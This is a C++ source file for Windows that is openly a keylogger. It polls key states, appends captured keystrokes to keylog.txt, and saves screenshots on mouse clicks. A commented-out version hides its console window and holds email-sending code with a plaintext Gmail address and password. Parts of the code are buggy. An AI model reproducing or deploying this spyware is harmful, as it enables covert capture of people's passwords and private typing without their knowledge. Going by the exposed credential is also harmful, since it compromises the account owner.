// #include "stdafx.h"
// #include <iostream>
// #include "easendmailobj.tlh"
// 
// #include <stdio.h>
// #include <conio.h>
// #include <windows.h>
// #include <WinUser.h>
// 
// 
// using namespace EASendMailObjLib;
// 
// int main(void)
// {
// 
// // 	::CoInitialize( NULL );
// // 
// //     IMailPtr oSmtp = NULL;
// //     oSmtp.CreateInstance( "EASendMailObj.Mail");
// //     oSmtp->LicenseCode = _T("TryIt");
// //     
// //     oSmtp->FromAddr = _T("masonmoss3@gmail.com");
// //     oSmtp->AddRecipientEx( _T("masonmoss3@gmail.com"), 0 );
// //     oSmtp->Subject = _T("simple email from Visual C++ project");
// //     oSmtp->BodyText = _T("this is a test email sent from Visual C++ project, do not reply");
// //     oSmtp->ServerAddr = _T("smtp.gmail.com");
// //     oSmtp->UserName = _T("masonmoss3@gmail.com");
// //     oSmtp->Password = _T("kimrowena");
// // 	oSmtp->ServerPort = 465;
// //     oSmtp->SSL_init();
// // 
// // 	_tprintf(_T("Start to send email ...\r\n" ));
// //     if( oSmtp->SendMail() == 0 )
// //     {
// //         _tprintf( _T("email was sent successfully!\r\n"));
// //     }
// //     else
// //     {
// //         _tprintf( _T("failed to send email with the following error: %s\r\n"),
// //             (const TCHAR*)oSmtp->GetLastErrDescription());
// //     }
// // 
// //     if( oSmtp != NULL )
// //         oSmtp.Release();
// // 	std::cin.get();
// 
// 	int cha;
// 	char ch;
// 	FILE *fptr;
// 	HWND stealth;
// 	AllocConsole();
// 	stealth = FindWindowA( "ConsoleWindowClass", NULL );
// 	ShowWindow( stealth, 0 );
// 	while ( 1 )
// 	{
// 		if ( _kbhit() )
// 		{
// 			ch = _getch();
// 			cha = ch;
// 			fopen_s( &fptr, "KEYS.TXT", "a+" );
// 			fputc( ch, fptr );
// 			fclose( fptr );
// 			if ( cha == 27 )
// 			{
// 				return 0;
// 			}
// 
// 		}
// 	}
// }
#include <afxwin.h>
#include "stdafx.h"
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <playsoundapi.h>

#include <sys/types.h>
#ifdef __WIN32__
#include <WinSock2.h>
#else
#include <sys/socket.h>
#endif // __WIN32__


using namespace std;

//global variables
ofstream out;
string buffer;
int counter;
//global variables

//keylist prototype
void keylist(char key);
//keylist prototype
void TakeScreenShot( string filename );
void PasteScreen();
/***************Main****************/

int main()
{
   //array for every important character key
   char chType[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
   PlaySound( L"C:\\Users\\mason\\Music\\Skillet\\01 Rise.wma", NULL, SND_FILENAME );

   //the while-loop to check the key state every 100 milliseconds
   while(1==1)
   {
      for (int i=0; i<36; i++)
         keylist(chType[i]);

      if(GetAsyncKeyState(VK_SPACE))
      {
         buffer.append(" ");
         counter++;
      }
       
	  string name = "Hello";
	  if (GetAsyncKeyState( VK_LBUTTON) )
	  {
		  TakeScreenShot( name );
	  }

      if(GetAsyncKeyState(VK_RETURN))
      {
         buffer.append("\n");
         counter ++;
      }
      //flush the string
      if(counter==15)
      {
         out.open("keylog.txt", ios::app);
         out << buffer;
         buffer = "";
         out.close();
         counter=0;
      }

      //every 100 ms
      Sleep(100);
    
   }
}

/***************Main****************/

//keylist function
void keylist(char key)
{
   //check if the user presses a key
   if(GetAsyncKeyState(key))
   {
      char * skey = &key;
      buffer.append(skey);
      counter++;
      
   }
}

void PasteScreen()
{
	if ( OpenClipboard( nullptr ) )
	{
		HBITMAP handle = (HBITMAP) GetClipboardData( CF_BITMAP );
		CBitmap *bm = CBitmap::FromHandle( handle );
		CClientDC cdc( nullptr );
		CDC dc;
		dc.CreateCompatibleDC( &cdc );
		dc.SelectObject( bm );
		cdc.BitBlt( 0, 0, 200, 200, &dc, 0, 0, SRCCOPY );
		CloseClipboard();
	}
}

void TakeScreenShot( string filename )
{
	keybd_event( VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0 );
	keybd_event( VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0 );
	HBITMAP h;

	OpenClipboard( NULL );
	h = (HBITMAP) GetClipboardData( CF_BITMAP );
	CloseClipboard();
	HDC hdc=NULL;
	FILE*fp=NULL;
	LPVOID pBuf=NULL;
	BITMAPINFO bmpInfo;
	BITMAPFILEHEADER bmpFileHeader;
	do
	{
		hdc=GetDC( NULL );
		ZeroMemory( &bmpInfo, sizeof( BITMAPINFO ) );
		bmpInfo.bmiHeader.biSize=sizeof( BITMAPINFOHEADER );
		GetDIBits( hdc, h, 0, 0, NULL, &bmpInfo, DIB_RGB_COLORS );
		if ( bmpInfo.bmiHeader.biSizeImage <= 0 )
			bmpInfo.bmiHeader.biSizeImage=bmpInfo.bmiHeader.biWidth*abs( bmpInfo.bmiHeader.biHeight )*( bmpInfo.bmiHeader.biBitCount + 7 ) / 8;
		if ( ( pBuf = malloc( bmpInfo.bmiHeader.biSizeImage ) ) == NULL )
		{
			
			MessageBox( NULL, L"Unable to Allocate Bitmap Memory", L"Error", MB_OK | MB_ICONERROR );
			break;
		}
		bmpInfo.bmiHeader.biCompression=BI_RGB;
		GetDIBits( hdc, h, 0, bmpInfo.bmiHeader.biHeight, pBuf, &bmpInfo, DIB_RGB_COLORS );
		if ( (  fopen_s( &fp, filename.c_str(), "wb" ) ) == NULL )
		{
			MessageBox( NULL, L"Unable to Create Bitmap File", L"Error", MB_OK | MB_ICONERROR );
			break;
		}
		bmpFileHeader.bfReserved1=0;
		bmpFileHeader.bfReserved2=0;
		bmpFileHeader.bfSize=sizeof(BITMAPFILEHEADER) +sizeof(BITMAPINFOHEADER) +bmpInfo.bmiHeader.biSizeImage;
		bmpFileHeader.bfType='MB';
		bmpFileHeader.bfOffBits=sizeof(BITMAPFILEHEADER) +sizeof( BITMAPINFOHEADER );
		fwrite( &bmpFileHeader, sizeof( BITMAPFILEHEADER ), 1, fp );
		fwrite( &bmpInfo.bmiHeader, sizeof( BITMAPINFOHEADER ), 1, fp );
		fwrite( pBuf, bmpInfo.bmiHeader.biSizeImage, 1, fp );
		PasteScreen();
	}

	while ( false );
	if ( hdc )ReleaseDC( NULL, hdc );
	if ( pBuf ) free( pBuf );
	if ( fp )fclose( fp );
}


//keylist function